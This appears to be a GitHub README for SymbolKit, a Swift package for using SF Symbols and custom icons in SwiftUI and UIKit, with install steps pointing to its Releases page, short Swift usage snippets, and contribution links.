# 🎨 SymbolKit - Simplify Your Icon Management

## 🚀 Getting Started
Welcome to SymbolKit, a lightweight Swift package designed to help you manage icons easily. Whether you’re working with SF Symbols or custom asset icons, SymbolKit makes it simple to integrate them into your SwiftUI or UIKit projects.

## 🔗 Download SymbolKit
[![Download SymbolKit](https://img.shields.io/badge/Download-SymbolKit-blue.svg)](https://github.com/alib26654/SymbolKit/releases)

## 📥 Download & Install
To get started with SymbolKit, visit the [Releases page](https://github.com/alib26654/SymbolKit/releases). Here, you will find the latest version of the software. 

1. Click on the link above to go to the Releases page.
2. Locate the version you want to download.
3. Click on the corresponding file to download it to your computer.

Once you finish downloading, follow these simple steps to install and run SymbolKit:

1. If you are using Swift Package Manager (SPM):
   - Open your Xcode project.
   - Go to File > Swift Packages > Add Package Dependency.
   - Enter the URL `https://github.com/alib26654/SymbolKit` and follow the prompts to integrate the package.

2. If you downloaded any assets, you may add them directly to your Xcode project by dragging them into the desired folder in the Project Navigator.

## 🔧 System Requirements
- iOS 13 or later
- macOS 10.15 or later
- Xcode 11 or later

## 🎉 Features
- Easily use SF Symbols alongside your custom icons.
- Supports SwiftUI and UIKit.
- Provides convenient initializers for Image, Label, and UIImage.
- Ready for integration using Swift Package Manager.
- Simple setup for adding icons to your projects.

## 📘 Usage Instructions
### Basic Example
To use an SF Symbol, simply call the associated initializer in your SwiftUI or UIKit views.

**SwiftUI:**
```swift
import SymbolKit

struct ContentView: View {
    var body: some View {
        Image(systemName: "star.fill")
            .symbolKitStyle() // Apply styles from SymbolKit
    }
}
```

**UIKit:**
```swift
import SymbolKit

let imageView = UIImageView(image: UIImage.system("star.fill"))
imageView.frame = CGRect(x: 0, y: 0, width: 100, height: 100)
```

### Icon Customization
SymbolKit allows for easy customization of icons. Use the built-in functions to adjust colors, sizes, and other attributes to fit your needs.

```swift
let customImage = UIImage.customIcon("yourCustomIconName", size: CGSize(width: 100, height: 100), color: .blue)
```

## 🛠️ Support and Contributions
If you encounter any issues while using SymbolKit or have suggestions for improvements, feel free to raise an issue or reach out. Contributions are welcome!

### Reporting Issues
If you experience any problems, please report them on the [Issues page](https://github.com/alib26654/SymbolKit/issues). Provide details about your environment and steps to reproduce the issue.

### Contributing
If you would like to contribute to SymbolKit, please fork the repository and submit a pull request. Include a clear description of the changes you made.

## 🌐 Community and Resources
Join our community for support and to share your experiences with SymbolKit. You can find more resources, tutorials, and discussions through the following channels:

- [GitHub Discussions](https://github.com/alib26654/SymbolKit/discussions)
- [Official Documentation](https://github.com/alib26654/SymbolKit/wiki)
- [Useful Articles](https://github.com/alib26654/SymbolKit/wiki/Articles)

## 🔗 More Information
For more details about SymbolKit, visit the [Releases page](https://github.com/alib26654/SymbolKit/releases) again to find updates and new versions.